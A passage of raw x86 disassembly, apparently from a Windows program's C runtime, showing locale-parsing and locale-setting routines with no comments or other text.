  42f706:	push   0xf
  42f708:	push   eax
  42f709:	lea    eax,[edi+0x80]
  42f70f:	push   eax
  42f710:	call   0x434d20
  42f715:	add    esp,0xc
  42f718:	mov    BYTE PTR [edi+0x8f],0x0
  42f71f:	xor    eax,eax
  42f721:	jmp    0x42f7ad
  42f726:	and    DWORD PTR [ebp+0xc],0x0
  42f72a:	push   ebx
  42f72b:	jmp    0x42f798
  42f72d:	cmp    DWORD PTR [ebp+0xc],0x0
  42f731:	lea    edi,[eax+esi*1]
  42f734:	mov    bl,BYTE PTR [edi]
  42f736:	jne    0x42f749
  42f738:	cmp    eax,0x40
  42f73b:	jae    0x42f7a9
  42f73d:	cmp    bl,0x2e
  42f740:	je     0x42f7a9
  42f742:	push   eax
  42f743:	push   esi
  42f744:	push   DWORD PTR [ebp+0x8]
  42f747:	jmp    0x42f781
  42f749:	cmp    DWORD PTR [ebp+0xc],0x1
  42f74d:	jne    0x42f762
  42f74f:	cmp    eax,0x40
  42f752:	jae    0x42f7a9
  42f754:	cmp    bl,0x5f
  42f757:	je     0x42f7a9
  42f759:	push   eax
  42f75a:	mov    eax,DWORD PTR [ebp+0x8]
  42f75d:	add    eax,0x40
  42f760:	jmp    0x42f77f
  42f762:	cmp    DWORD PTR [ebp+0xc],0x2
  42f766:	jne    0x42f7a9
  42f768:	cmp    eax,0x10
  42f76b:	jae    0x42f7a9
  42f76d:	test   bl,bl
  42f76f:	je     0x42f776
  42f771:	cmp    bl,0x2c
  42f774:	jne    0x42f7a9
  42f776:	push   eax
  42f777:	mov    eax,DWORD PTR [ebp+0x8]
  42f77a:	add    eax,0x80
  42f77f:	push   esi
  42f780:	push   eax
  42f781:	call   0x434d20
  42f786:	add    esp,0xc
  42f789:	cmp    bl,0x2c
  42f78c:	je     0x42f7b1
  42f78e:	test   bl,bl
  42f790:	je     0x42f7b1
  42f792:	inc    DWORD PTR [ebp+0xc]
  42f795:	lea    esi,[edi+0x1]
  42f798:	push   0x4396d0
  42f79d:	push   esi
  42f79e:	call   0x434cd0
  42f7a3:	test   eax,eax
  42f7a5:	pop    ecx
  42f7a6:	pop    ecx
  42f7a7:	jne    0x42f72d
  42f7a9:	or     eax,0xffffffff
  42f7ac:	pop    ebx
  42f7ad:	pop    edi
  42f7ae:	pop    esi
  42f7af:	pop    ebp
  42f7b0:	ret    
  42f7b1:	xor    eax,eax
  42f7b3:	jmp    0x42f7ac
  42f7b5:	push   esi
  42f7b6:	mov    esi,DWORD PTR [esp+0xc]
  42f7ba:	push   esi
  42f7bb:	push   DWORD PTR [esp+0xc]
  42f7bf:	call   0x432780
  42f7c4:	lea    eax,[esi+0x40]
  42f7c7:	cmp    BYTE PTR [eax],0x0
  42f7ca:	pop    ecx
  42f7cb:	pop    ecx
  42f7cc:	je     0x42f7e2
  42f7ce:	push   eax
  42f7cf:	push   0x4396d8
  42f7d4:	push   0x2
  42f7d6:	push   DWORD PTR [esp+0x14]
  42f7da:	call   0x42f6b5
  42f7df:	add    esp,0x10
  42f7e2:	lea    eax,[esi+0x80]
  42f7e8:	cmp    BYTE PTR [eax],0x0
  42f7eb:	pop    esi
  42f7ec:	je     0x42f802
  42f7ee:	push   eax
  42f7ef:	push   0x4396d4
  42f7f4:	push   0x2
  42f7f6:	push   DWORD PTR [esp+0x10]
  42f7fa:	call   0x42f6b5
  42f7ff:	add    esp,0x10
  42f802:	ret    
  42f803:	push   0xc
  42f805:	push   0x4396e0
  42f80a:	call   0x431210
  42f80f:	push   0xc
  42f811:	call   0x431126
  42f816:	pop    ecx
  42f817:	and    DWORD PTR [ebp-0x4],0x0
  42f81b:	call   0x42f5f4
  42f820:	mov    DWORD PTR [ebp-0x1c],eax
  42f823:	or     DWORD PTR [ebp-0x4],0xffffffff
  42f827:	call   0x42f835
  42f82c:	mov    eax,DWORD PTR [ebp-0x1c]
  42f82f:	call   0x43124b
  42f834:	ret    
  42f835:	push   0xc
  42f837:	call   0x431071
  42f83c:	pop    ecx
  42f83d:	ret    
  42f83e:	mov    eax,ds:0x43d82c
  42f843:	push   ebp
  42f844:	xor    ebp,ebp
  42f846:	inc    ebp
  42f847:	test   eax,eax
  42f849:	jne    0x42f861
  42f84b:	push   0x351
  42f850:	call   0x4311fe
  42f855:	test   eax,eax
  42f857:	pop    ecx
  42f858:	mov    ds:0x43d82c,eax
  42f85d:	jne    0x42f861
  42f85f:	pop    ebp
  42f860:	ret    
  42f861:	push   ebx
  42f862:	push   esi
  42f863:	push   edi
  42f864:	mov    BYTE PTR [eax],0x0
  42f867:	push   DWORD PTR ds:0x43d838
  42f86d:	mov    edi,0x4396f0
  42f872:	push   edi
  42f873:	push   DWORD PTR ds:0x43d834
  42f879:	push   0x3
  42f87b:	push   DWORD PTR ds:0x43d82c
  42f881:	call   0x42f6b5
  42f886:	mov    esi,0x43d838
  42f88b:	add    esp,0x14
  42f88e:	mov    ebx,esi
  42f890:	push   0x4396ec
  42f895:	push   DWORD PTR ds:0x43d82c
  42f89b:	call   0x432790
  42f8a0:	add    esi,0xc
  42f8a3:	push   DWORD PTR [esi]
  42f8a5:	push   DWORD PTR [ebx]
  42f8a7:	call   0x432b80
  42f8ac:	add    esp,0x10
  42f8af:	test   eax,eax
  42f8b1:	je     0x42f8b5
  42f8b3:	xor    ebp,ebp
  42f8b5:	push   DWORD PTR [esi]
  42f8b7:	mov    ebx,esi
  42f8b9:	push   edi
  42f8ba:	push   DWORD PTR [esi-0x4]
  42f8bd:	push   0x3
  42f8bf:	push   DWORD PTR ds:0x43d82c
  42f8c5:	call   0x42f6b5
  42f8ca:	add    esp,0x14
  42f8cd:	cmp    esi,0x43d868
  42f8d3:	jl     0x42f890
  42f8d5:	test   ebp,ebp
  42f8d7:	pop    edi
  42f8d8:	pop    esi
  42f8d9:	pop    ebx
  42f8da:	jne    0x42f8e3
  42f8dc:	mov    eax,ds:0x43d82c
  42f8e1:	pop    ebp
  42f8e2:	ret    
  42f8e3:	push   DWORD PTR ds:0x43d82c
  42f8e9:	call   0x42e0ed
  42f8ee:	and    DWORD PTR ds:0x43d82c,0x0
  42f8f5:	mov    eax,ds:0x43d844
  42f8fa:	pop    ecx
  42f8fb:	pop    ebp
  42f8fc:	ret    
  42f8fd:	push   ebp
  42f8fe:	mov    ebp,esp
  42f900:	sub    esp,0x94
  42f906:	mov    eax,ds:0x43d404
  42f90b:	push   esi
  42f90c:	mov    esi,DWORD PTR [ebp+0x8]
  42f90f:	xor    edx,edx
  42f911:	cmp    esi,edx
  42f913:	mov    DWORD PTR [ebp-0x4],eax
  42f916:	jne    0x42f91f
  42f918:	xor    eax,eax
  42f91a:	jmp    0x42fa4e
  42f91f:	cmp    BYTE PTR [esi],0x43
  42f922:	jne    0x42f958
  42f924:	cmp    BYTE PTR [esi+0x1],0x0
  42f928:	jne    0x42f958
  42f92a:	mov    eax,DWORD PTR [ebp+0xc]
  42f92d:	mov    ecx,DWORD PTR [ebp+0x10]
  42f930:	cmp    ecx,edx
  42f932:	mov    BYTE PTR [eax],0x43
  42f935:	mov    BYTE PTR [eax+0x1],0x0
  42f939:	je     0x42f946
  42f93b:	mov    WORD PTR [ecx],dx
  42f93e:	mov    WORD PTR [ecx+0x2],dx
  42f942:	mov    WORD PTR [ecx+0x4],dx
  42f946:	mov    ecx,DWORD PTR [ebp+0x14]
  42f949:	cmp    ecx,edx
  42f94b:	je     0x42fa4e
  42f951:	mov    DWORD PTR [ecx],edx
  42f953:	jmp    0x42fa4e
  42f958:	push   ebx
  42f959:	push   edi
  42f95a:	push   esi
  42f95b:	call   0x42e160
  42f960:	mov    edi,0x82
  42f965:	cmp    eax,edi
  42f967:	pop    ecx
  42f968:	mov    ebx,0x43d718
  42f96d:	jae    0x42f991
  42f96f:	push   esi
  42f970:	push   0x43d7a0
  42f975:	call   0x432b80
  42f97a:	test   eax,eax
  42f97c:	pop    ecx
  42f97d:	pop    ecx
  42f97e:	je     0x42fa0a
  42f984:	push   esi
  42f985:	push   ebx
  42f986:	call   0x432b80
  42f98b:	test   eax,eax
  42f98d:	pop    ecx
  42f98e:	pop    ecx
  42f98f:	je     0x42fa0a
  42f991:	lea    eax,[ebp-0x94]
  42f997:	push   esi
  42f998:	push   eax
  42f999:	call   0x42f6d9
  42f99e:	test   eax,eax
  42f9a0:	pop    ecx
  42f9a1:	pop    ecx
  42f9a2:	jne    0x42f9bd
  42f9a4:	lea    eax,[ebp-0x94]
  42f9aa:	push   eax
  42f9ab:	push   0x43fb48
  42f9b0:	push   eax
  42f9b1:	call   0x435583
  42f9b6:	add    esp,0xc
  42f9b9:	test   eax,eax
  42f9bb:	jne    0x42f9c4
  42f9bd:	xor    eax,eax
  42f9bf:	jmp    0x42fa4c
  42f9c4:	movzx  eax,WORD PTR ds:0x43fb4c
  42f9cb:	mov    ds:0x43fb50,eax
  42f9d0:	lea    eax,[ebp-0x94]
  42f9d6:	push   eax
  42f9d7:	push   0x43d7a0
  42f9dc:	call   0x42f7b5
  42f9e1:	cmp    BYTE PTR [esi],0x0
  42f9e4:	pop    ecx
  42f9e5:	pop    ecx
  42f9e6:	je     0x42f9f3
  42f9e8:	push   esi
  42f9e9:	call   0x42e160
  42f9ee:	cmp    eax,edi
  42f9f0:	pop    ecx
  42f9f1:	jb     0x42f9f8
  42f9f3:	mov    esi,0x4396f2
  42f9f8:	push   edi
  42f9f9:	push   esi
  42f9fa:	push   ebx
  42f9fb:	mov    BYTE PTR ds:0x43d79a,0x0
  42fa02:	call   0x434d20
  42fa07:	add    esp,0xc
  42fa0a:	cmp    DWORD PTR [ebp+0x10],0x0
  42fa0e:	je     0x42fa22
  42fa10:	push   0x6
  42fa12:	push   0x43fb48
  42fa17:	push   DWORD PTR [ebp+0x10]
  42fa1a:	call   0x42da10
  42fa1f:	add    esp,0xc
  42fa22:	cmp    DWORD PTR [ebp+0x14],0x0
  42fa26:	je     0x42fa3a
  42fa28:	push   0x4
  42fa2a:	push   0x43fb50
  42fa2f:	push   DWORD PTR [ebp+0x14]
  42fa32:	call   0x42da10
  42fa37:	add    esp,0xc
  42fa3a:	mov    esi,0x43d7a0
  42fa3f:	push   esi
  42fa40:	push   DWORD PTR [ebp+0xc]
  42fa43:	call   0x432780
  42fa48:	pop    ecx
  42fa49:	pop    ecx
  42fa4a:	mov    eax,esi
  42fa4c:	pop    edi
  42fa4d:	pop    ebx
  42fa4e:	mov    ecx,DWORD PTR [ebp-0x4]
  42fa51:	pop    esi
  42fa52:	call   0x42f1f2
  42fa57:	leave  
  42fa58:	ret    
  42fa59:	push   ebp
  42fa5a:	lea    ebp,[esp-0x74]
  42fa5e:	sub    esp,0x1c0
  42fa64:	mov    eax,ds:0x43d404
  42fa69:	mov    DWORD PTR [ebp+0x70],eax
  42fa6c:	push   esi
  42fa6d:	lea    eax,[ebp-0x11c]
  42fa73:	push   eax
  42fa74:	lea    eax,[ebp-0x138]
  42fa7a:	push   eax
  42fa7b:	lea    eax,[ebp-0x14]
  42fa7e:	push   eax
  42fa7f:	push   DWORD PTR [ebp+0x7c]
  42fa82:	call   0x42f8fd
  42fa87:	add    esp,0x14
  42fa8a:	test   eax,eax
  42fa8c:	je     0x42fcdb
  42fa92:	push   ebx
  42fa93:	lea    ebx,[esi+esi*2]
  42fa96:	shl    ebx,0x2
  42fa99:	push   DWORD PTR [ebx+0x43d82c]
  42fa9f:	lea    eax,[ebp-0x14]
  42faa2:	push   eax
  42faa3:	call   0x432b80
  42faa8:	test   eax,eax
  42faaa:	pop    ecx
  42faab:	pop    ecx
  42faac:	jne    0x42fab9
  42faae:	mov    eax,DWORD PTR [ebx+0x43d82c]
  42fab4:	jmp    0x42fcda
  42fab9:	lea    eax,[ebp-0x14]
  42fabc:	push   eax
  42fabd:	call   0x42e160
  42fac2:	inc    eax
  42fac3:	push   eax
  42fac4:	call   0x4311fe
  42fac9:	test   eax,eax
  42facb:	pop    ecx
  42facc:	pop    ecx
  42facd:	mov    DWORD PTR [ebp-0x124],eax
  42fad3:	je     0x42fcda
  42fad9:	mov    eax,DWORD PTR [ebx+0x43d82c]
  42fadf:	push   edi
  42fae0:	mov    DWORD PTR [ebp-0x120],eax
  42fae6:	lea    edi,[esi*4+0x43fe4c]
  42faed:	mov    eax,DWORD PTR [edi]
  42faef:	mov    DWORD PTR [ebp-0x13c],eax
  42faf5:	lea    eax,[esi+esi*2]
  42faf8:	lea    eax,[eax*2+0x43fe70]
  42faff:	push   0x6
  42fb01:	push   eax
  42fb02:	mov    DWORD PTR [ebp-0x118],eax
  42fb08:	lea    eax,[ebp-0x14c]
  42fb0e:	push   eax
  42fb0f:	call   0x42da10
  42fb14:	mov    eax,ds:0x43fe64
  42fb19:	mov    DWORD PTR [ebp-0x128],eax
  42fb1f:	lea    eax,[ebp-0x14]
  42fb22:	push   eax
  42fb23:	push   DWORD PTR [ebp-0x124]
  42fb29:	call   0x432780
  42fb2e:	mov    DWORD PTR [ebx+0x43d82c],eax
  42fb34:	movzx  eax,WORD PTR [ebp-0x138]
  42fb3b:	mov    DWORD PTR [edi],eax
  42fb3d:	push   0x6
  42fb3f:	lea    eax,[ebp-0x138]
  42fb45:	push   eax
  42fb46:	push   DWORD PTR [ebp-0x118]
  42fb4c:	call   0x42da10
  42fb51:	add    esp,0x20
  42fb54:	cmp    esi,0x2
  42fb57:	jne    0x42fc72
  42fb5d:	mov    eax,DWORD PTR [ebp-0x11c]
  42fb63:	mov    ecx,DWORD PTR ds:0x43d710
  42fb69:	and    DWORD PTR [ebp-0x118],0x0
  42fb70:	mov    ds:0x43fe64,eax
  42fb75:	mov    eax,ds:0x43d714
  42fb7a:	mov    DWORD PTR [ebp-0x12c],eax
  42fb80:	mov    eax,0x43d6f0
  42fb85:	mov    edx,DWORD PTR [ebp-0x11c]
  42fb8b:	cmp    edx,DWORD PTR [eax]
  42fb8d:	je     0x42fbc3
  42fb8f:	mov    edx,DWORD PTR [eax]
  42fb91:	inc    DWORD PTR [ebp-0x118]
  42fb97:	mov    DWORD PTR [eax],ecx
  42fb99:	mov    ecx,DWORD PTR [ebp-0x12c]
  42fb9f:	mov    DWORD PTR [ebp-0x144],edx
  42fba5:	mov    edx,DWORD PTR [eax+0x4]
  42fba8:	mov    DWORD PTR [eax+0x4],ecx
  42fbab:	mov    ecx,DWORD PTR [ebp-0x144]
  42fbb1:	add    eax,0x8
  42fbb4:	cmp    eax,0x43d718
  42fbb9:	mov    DWORD PTR [ebp-0x12c],edx
  42fbbf:	jl     0x42fb85
  42fbc1:	jmp    0x42fbf0
  42fbc3:	mov    eax,DWORD PTR [ebp-0x118]
  42fbc9:	test   eax,eax
  42fbcb:	je     0x42fbf0
  42fbcd:	lea    eax,[eax*8+0x43d6f0]
  42fbd4:	mov    edx,DWORD PTR [eax]
  42fbd6:	mov    DWORD PTR ds:0x43d6f0,edx
  42fbdc:	mov    edx,DWORD PTR [eax+0x4]
  42fbdf:	mov    DWORD PTR ds:0x43d6f4,edx
  42fbe5:	mov    DWORD PTR [eax],ecx
  42fbe7:	mov    ecx,DWORD PTR [ebp-0x12c]
  42fbed:	mov    DWORD PTR [eax+0x4],ecx
  42fbf0:	cmp    DWORD PTR [ebp-0x118],0x5
  42fbf7:	jne    0x42fc68
  42fbf9:	push   0x1
  42fbfb:	push   DWORD PTR ds:0x43fe54
  42fc01:	lea    eax,[ebp-0x114]
  42fc07:	push   DWORD PTR [ebp-0x11c]
  42fc0d:	push   eax
  42fc0e:	push   0x7f
  42fc10:	push   0x439610
  42fc15:	push   0x1
  42fc17:	call   0x435738
  42fc1c:	add    esp,0x1c
  42fc1f:	test   eax,eax
  42fc21:	je     0x42fc53
  42fc23:	xor    eax,eax
  42fc25:	and    BYTE PTR [ebp+eax*2-0x113],0x1
  42fc2d:	inc    eax
  42fc2e:	cmp    eax,0x7f
  42fc31:	jb     0x42fc25
  42fc33:	push   0xfe
  42fc38:	lea    eax,[ebp-0x114]
  42fc3e:	push   0x439510
  42fc43:	push   eax
  42fc44:	call   0x42f460
  42fc49:	add    esp,0xc
  42fc4c:	neg    eax
  42fc4e:	sbb    eax,eax
  42fc50:	inc    eax
  42fc51:	jmp    0x42fc55
  42fc53:	xor    eax,eax
  42fc55:	mov    ecx,DWORD PTR ds:0x43fe64
  42fc5b:	mov    ds:0x43d6f4,eax
  42fc60:	mov    DWORD PTR ds:0x43d6f0,ecx
  42fc66:	jmp    0x42fc6d
  42fc68:	mov    eax,ds:0x43d6f4
  42fc6d:	mov    ds:0x43dd80,eax
  42fc72:	cmp    esi,0x1
  42fc75:	jne    0x42fc82
  42fc77:	mov    eax,DWORD PTR [ebp-0x11c]
  42fc7d:	mov    ds:0x43fe68,eax
  42fc82:	call   DWORD PTR [ebx+0x43d830]
  42fc88:	test   eax,eax
  42fc8a:	je     0x42fcbb
  42fc8c:	mov    eax,DWORD PTR [ebp-0x120]
  42fc92:	push   DWORD PTR [ebp-0x124]
  42fc98:	mov    DWORD PTR [ebx+0x43d82c],eax
  42fc9e:	call   0x42e0ed
  42fca3:	mov    eax,DWORD PTR [ebp-0x13c]
  42fca9:	mov    DWORD PTR [edi],eax
  42fcab:	mov    eax,DWORD PTR [ebp-0x128]
  42fcb1:	mov    ds:0x43fe64,eax
  42fcb6:	pop    ecx
  42fcb7:	xor    eax,eax
  42fcb9:	jmp    0x42fcd9
  42fcbb:	cmp    DWORD PTR [ebp-0x120],0x43d690
  42fcc5:	je     0x42fcd3
  42fcc7:	push   DWORD PTR [ebp-0x120]
  42fccd:	call   0x42e0ed
  42fcd2:	pop    ecx
  42fcd3:	mov    eax,DWORD PTR [ebx+0x43d82c]
  42fcd9:	pop    edi
  42fcda:	pop    ebx
  42fcdb:	mov    ecx,DWORD PTR [ebp+0x70]
  42fcde:	call   0x42f1f2
  42fce3:	add    ebp,0x74
  42fce6:	leave  
  42fce7:	ret    
  42fce8:	push   ebp
  42fce9:	lea    ebp,[esp-0x78]
  42fced:	sub    esp,0x94
  42fcf3:	mov    eax,ds:0x43d404
  42fcf8:	push   ebx
  42fcf9:	push   esi
  42fcfa:	mov    esi,edx
  42fcfc:	xor    ebx,ebx
  42fcfe:	cmp    esi,ebx
  42fd00:	push   edi
  42fd01:	mov    DWORD PTR [ebp+0x74],eax
  42fd04:	mov    edi,ecx
  42fd06:	je     0x42fd27
  42fd08:	cmp    edi,ebx
  42fd0a:	je     0x42fd18
  42fd0c:	push   edi
  42fd0d:	call   0x42fa59
  42fd12:	pop    ecx
  42fd13:	jmp    0x42fe1e
  42fd18:	lea    eax,[esi+esi*2]
  42fd1b:	mov    esi,DWORD PTR [eax*4+0x43d82c]
  42fd22:	jmp    0x42fe20
  42fd27:	cmp    edi,ebx
  42fd29:	mov    DWORD PTR [ebp-0x18],0x1
  42fd30:	mov    DWORD PTR [ebp-0x14],ebx
  42fd33:	je     0x42fe19
  42fd39:	cmp    BYTE PTR [edi],0x4c
  42fd3c:	jne    0x42fe36
  42fd42:	cmp    BYTE PTR [edi+0x1],0x43
  42fd46:	jne    0x42fe36
  42fd4c:	cmp    BYTE PTR [edi+0x2],0x5f
  42fd50:	jne    0x42fe36
  42fd56:	push   0x4396f4
  42fd5b:	push   edi
  42fd5c:	call   0x435940
  42fd61:	mov    ebx,eax
  42fd63:	test   ebx,ebx
  42fd65:	pop    ecx
  42fd66:	pop    ecx
  42fd67:	je     0x42fe32
  42fd6d:	sub    eax,edi
  42fd6f:	mov    DWORD PTR [ebp-0x18],eax
  42fd72:	je     0x42fe32
  42fd78:	cmp    BYTE PTR [ebx],0x3b
  42fd7b:	je     0x42fe32
  42fd81:	mov    DWORD PTR [ebp-0x1c],0x1
  42fd88:	mov    esi,0x43d834
  42fd8d:	jmp    0x42fd92
  42fd8f:	mov    eax,DWORD PTR [ebp-0x18]
  42fd92:	push   eax
  42fd93:	push   edi
  42fd94:	push   DWORD PTR [esi]
  42fd96:	call   0x435900
  42fd9b:	add    esp,0xc
  42fd9e:	test   eax,eax
  42fda0:	jne    0x42fdaf
  42fda2:	push   DWORD PTR [esi]
  42fda4:	call   0x42e160
  42fda9:	cmp    DWORD PTR [ebp-0x18],eax
  42fdac:	pop    ecx
  42fdad:	je     0x42fdbd
  42fdaf:	inc    DWORD PTR [ebp-0x1c]
  42fdb2:	add    esi,0xc
  42fdb5:	cmp    esi,0x43d864
  42fdbb:	jle    0x42fd8f
  42fdbd:	inc    ebx
  42fdbe:	push   0x4396ec
  42fdc3:	push   ebx
  42fdc4:	call   0x434cd0
  42fdc9:	mov    edi,eax
  42fdcb:	test   edi,edi
  42fdcd:	pop    ecx
  42fdce:	pop    ecx
  42fdcf:	jne    0x42fdd6
  42fdd1:	cmp    BYTE PTR [ebx],0x3b
  42fdd4:	jne    0x42fe32
  42fdd6:	mov    esi,DWORD PTR [ebp-0x1c]
  42fdd9:	cmp    esi,0x5
  42fddc:	jg     0x42fe01
  42fdde:	push   edi
  42fddf:	lea    eax,[ebp-0x10]
  42fde2:	push   ebx
  42fde3:	push   eax
  42fde4:	call   0x434d20
  42fde9:	lea    eax,[ebp-0x10]
  42fdec:	push   eax
  42fded:	mov    BYTE PTR [ebp+edi*1-0x10],0x0
  42fdf2:	call   0x42fa59
  42fdf7:	add    esp,0x10
  42fdfa:	test   eax,eax
  42fdfc:	je     0x42fe01
  42fdfe:	inc    DWORD PTR [ebp-0x14]
  42fe01:	add    edi,ebx
  42fe03:	cmp    BYTE PTR [edi],0x0
  42fe06:	je     0x42fe12
  42fe08:	inc    edi
  42fe09:	cmp    BYTE PTR [edi],0x0
  42fe0c:	jne    0x42fd56
  42fe12:	xor    esi,esi
  42fe14:	cmp    DWORD PTR [ebp-0x14],esi
  42fe17:	je     0x42fe20
  42fe19:	call   0x42f83e
  42fe1e:	mov    esi,eax
  42fe20:	mov    eax,esi
  42fe22:	mov    ecx,DWORD PTR [ebp+0x74]
  42fe25:	pop    edi
  42fe26:	pop    esi
  42fe27:	pop    ebx
  42fe28:	call   0x42f1f2
  42fe2d:	add    ebp,0x78
  42fe30:	leave  
  42fe31:	ret    
  42fe32:	xor    eax,eax
  42fe34:	jmp    0x42fe22
  42fe36:	push   ebx
  42fe37:	push   ebx
  42fe38:	push   ebx
  42fe39:	lea    eax,[ebp-0x10]
  42fe3c:	push   eax
  42fe3d:	push   edi
  42fe3e:	call   0x42f8fd
  42fe43:	mov    esi,eax
  42fe45:	add    esp,0x14
  42fe48:	cmp    esi,ebx
  42fe4a:	je     0x42fe20
  42fe4c:	mov    edi,0x43d82c
  42fe51:	xor    esi,esi
  42fe53:	mov    ebx,edi
  42fe55:	cmp    ebx,edi
  42fe57:	je     0x42fe80
  42fe59:	push   DWORD PTR [ebx]
  42fe5b:	lea    eax,[ebp-0x10]
  42fe5e:	push   eax
  42fe5f:	call   0x432b80
  42fe64:	test   eax,eax
  42fe66:	pop    ecx
  42fe67:	pop    ecx
  42fe68:	je     0x42fe7d
  42fe6a:	lea    eax,[ebp-0x10]
  42fe6d:	push   eax
  42fe6e:	call   0x42fa59
  42fe73:	test   eax,eax
  42fe75:	pop    ecx
  42fe76:	jne    0x42fe7d
  42fe78:	and    DWORD PTR [ebp-0x18],eax
  42fe7b:	jmp    0x42fe80
  42fe7d:	inc    DWORD PTR [ebp-0x14]
  42fe80:	add    ebx,0xc
  42fe83:	inc    esi
  42fe84:	cmp    ebx,0x43d868
  42fe8a:	jle    0x42fe55
  42fe8c:	xor    edi,edi
  42fe8e:	cmp    DWORD PTR [ebp-0x18],edi
  42fe91:	je     0x42feb1
  42fe93:	call   0x42f83e
  42fe98:	push   DWORD PTR ds:0x43d82c
  42fe9e:	mov    esi,eax
  42fea0:	call   0x42e0ed
  42fea5:	pop    ecx
  42fea6:	mov    DWORD PTR ds:0x43d82c,edi
  42feac:	jmp    0x42fe20
  42feb1:	cmp    DWORD PTR [ebp-0x14],edi
  42feb4:	jne    0x42fe19
  42feba:	xor    esi,esi
  42febc:	jmp    0x42fe20
  42fec1:	push   0x14
  42fec3:	push   0x4396f8
  42fec8:	call   0x431210
  42fecd:	mov    edi,DWORD PTR [ebp+0x8]
  42fed0:	xor    ebx,ebx
  42fed2:	cmp    edi,ebx
  42fed4:	jl     0x430013
  42feda:	cmp    edi,0x5
  42fedd:	jg     0x430013
  42fee3:	push   0xc
  42fee5:	call   0x431126
  42feea:	pop    ecx
  42feeb:	mov    DWORD PTR [ebp-0x4],ebx
  42feee:	cmp    DWORD PTR [ebp+0xc],ebx
  42fef1:	jne    0x42ff12
  42fef3:	xor    ecx,ecx
  42fef5:	mov    edx,edi
  42fef7:	call   0x42fce8
  42fefc:	mov    esi,eax
  42fefe:	push   0xffffffff
  42ff00:	lea    eax,[ebp-0x10]
  42ff03:	push   eax
  42ff04:	call   0x42f0ba
  42ff09:	pop    ecx
  42ff0a:	pop    ecx
  42ff0b:	mov    eax,esi
  42ff0d:	jmp    0x430015
  42ff12:	push   0x54
  42ff14:	call   0x4311fe
  42ff19:	pop    ecx
  42ff1a:	mov    esi,eax
  42ff1c:	mov    DWORD PTR [ebp-0x24],esi
  42ff1f:	cmp    esi,ebx
  42ff21:	jne    0x42ff2b
  42ff23:	mov    DWORD PTR [ebp-0x1c],ebx
  42ff26:	jmp    0x42ffec
  42ff2b:	mov    ecx,DWORD PTR [ebp+0xc]
  42ff2e:	mov    edx,edi
  42ff30:	call   0x42fce8
  42ff35:	mov    DWORD PTR [ebp-0x1c],eax
  42ff38:	cmp    eax,ebx
  42ff3a:	je     0x42ffec
  42ff40:	mov    DWORD PTR [esi],ebx
  42ff42:	mov    eax,ds:0x43fe64
  42ff47:	mov    DWORD PTR [esi+0x4],eax
  42ff4a:	mov    eax,ds:0x43fe68
  42ff4f:	mov    DWORD PTR [esi+0x8],eax
  42ff52:	xor    eax,eax
  42ff54:	mov    DWORD PTR [ebp-0x20],eax
  42ff57:	cmp    eax,0x5
  42ff5a:	jg     0x42ff6a
  42ff5c:	mov    ecx,DWORD PTR [eax*4+0x43fe4c]
  42ff63:	mov    DWORD PTR [esi+eax*4+0xc],ecx
  42ff67:	inc    eax
  42ff68:	jmp    0x42ff54
  42ff6a:	mov    eax,ds:0x43dd80
  42ff6f:	mov    DWORD PTR [esi+0x24],eax
  42ff72:	mov    eax,ds:0x43dd90
  42ff77:	mov    DWORD PTR [esi+0x28],eax
  42ff7a:	mov    eax,ds:0x4650e4
  42ff7f:	mov    DWORD PTR [esi+0x2c],eax
  42ff82:	mov    eax,ds:0x4650e8
  42ff87:	mov    DWORD PTR [esi+0x30],eax
  42ff8a:	mov    eax,ds:0x4650e0
  42ff8f:	mov    DWORD PTR [esi+0x34],eax
  42ff92:	mov    eax,ds:0x43dd74
  42ff97:	mov    DWORD PTR [esi+0x38],eax
  42ff9a:	mov    eax,ds:0x43fe24
  42ff9f:	mov    DWORD PTR [esi+0x3c],eax
  42ffa2:	mov    eax,ds:0x46523c
  42ffa7:	mov    DWORD PTR [esi+0x40],eax
  42ffaa:	mov    eax,ds:0x465238
  42ffaf:	mov    DWORD PTR [esi+0x44],eax
  42ffb2:	mov    eax,ds:0x43d874
  42ffb7:	mov    DWORD PTR [esi+0x48],eax
  42ffba:	mov    eax,ds:0x43dc80
  42ffbf:	mov    DWORD PTR [esi+0x4c],eax
  42ffc2:	mov    eax,ds:0x43fe20
  42ffc7:	mov    DWORD PTR [esi+0x50],eax
  42ffca:	mov    eax,ds:0x43d6ec
  42ffcf:	cmp    DWORD PTR [eax],ebx
  42ffd1:	jne    0x42ffe1
  42ffd3:	cmp    eax,0x43d698
  42ffd8:	je     0x42ffe1
  42ffda:	push   eax
  42ffdb:	call   0x42f524
  42ffe0:	pop    ecx
  42ffe1:	mov    DWORD PTR ds:0x43d6ec,esi
  42ffe7:	call   0x42f5f4
  42ffec:	cmp    DWORD PTR [ebp-0x1c],ebx
  42ffef:	jne    0x42fffc
  42fff1:	cmp    esi,ebx
  42fff3:	je     0x42fffc
  42fff5:	push   esi
  42fff6:	call   0x42e0ed
  42fffb:	pop    ecx
  42fffc:	or     DWORD PTR [ebp-0x4],0xffffffff
  430000:	call   0x43000a
  430005:	mov    eax,DWORD PTR [ebp-0x1c]
  430008:	jmp    0x430015
  43000a:	push   0xc
  43000c:	call   0x431071
  430011:	pop    ecx
  430012:	ret    
  430013:	xor    eax,eax
  430015:	call   0x43124b
  43001a:	ret    
  43001b:	mov    eax,DWORD PTR [esi+0x4]
  43001e:	test   eax,eax
  430020:	je     0x430066
  430022:	lea    edx,[eax+0x8]
  430025:	cmp    BYTE PTR [edx],0x0
  430028:	je     0x430066
  43002a:	mov    ecx,DWORD PTR [edi+0x4]
  43002d:	cmp    eax,ecx
  43002f:	je     0x430041
  430031:	add    ecx,0x8
  430034:	push   ecx
  430035:	push   edx
  430036:	call   0x432b80
  43003b:	test   eax,eax
  43003d:	pop    ecx
  43003e:	pop    ecx
  43003f:	jne    0x430063
  430041:	test   BYTE PTR [edi],0x2
  430044:	je     0x43004b
  430046:	test   BYTE PTR [esi],0x8
  430049:	je     0x430063
  43004b:	mov    eax,DWORD PTR [esp+0x4]
  43004f:	mov    eax,DWORD PTR [eax]
  430051:	test   al,0x1
  430053:	je     0x43005a
  430055:	test   BYTE PTR [esi],0x1
  430058:	je     0x430063
  43005a:	test   al,0x2
  43005c:	je     0x430066
  43005e:	test   BYTE PTR [esi],0x2
  430061:	jne    0x430066
  430063:	xor    eax,eax
  430065:	ret    
  430066:	xor    eax,eax
  430068:	inc    eax
  430069:	ret    
  43006a:	mov    eax,DWORD PTR [eax]
  43006c:	cmp    DWORD PTR [eax],0xe06d7363
  430072:	je     0x430077
  430074:	xor    eax,eax
  430076:	ret    
  430077:	call   0x433901
  43007c:	and    DWORD PTR [eax+0x84],0x0
  430083:	jmp    0x433bed
